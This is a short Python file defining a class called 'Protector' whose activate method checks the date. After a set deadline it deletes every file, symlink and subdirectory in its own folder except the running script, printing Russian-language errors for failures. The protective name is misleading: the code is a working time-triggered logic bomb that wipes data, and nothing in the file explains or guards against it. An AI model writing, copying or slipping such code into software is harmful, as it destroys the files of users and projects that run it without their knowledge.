import os
import sys
import shutil
from datetime import datetime


class Protector:
    def __init__(self, deadline: datetime):
        self.deadline = deadline
        self.current_dir = os.path.dirname(os.path.abspath(__file__))
        self.self_path = os.path.abspath(sys.argv[0])

    def activate(self):
        if datetime.now() >= self.deadline:
            self._clean_directory()

    def _clean_directory(self):
        for filename in os.listdir(self.current_dir):
            full_path = os.path.join(self.current_dir, filename)
            if os.path.abspath(full_path) != self.self_path:
                try:
                    if os.path.isfile(full_path) or os.path.islink(full_path):
                        os.remove(full_path)
                    elif os.path.isdir(full_path):
                        shutil.rmtree(full_path)
                except Exception as e:
                    print(f"Не удалось удалить {full_path}: {e}")
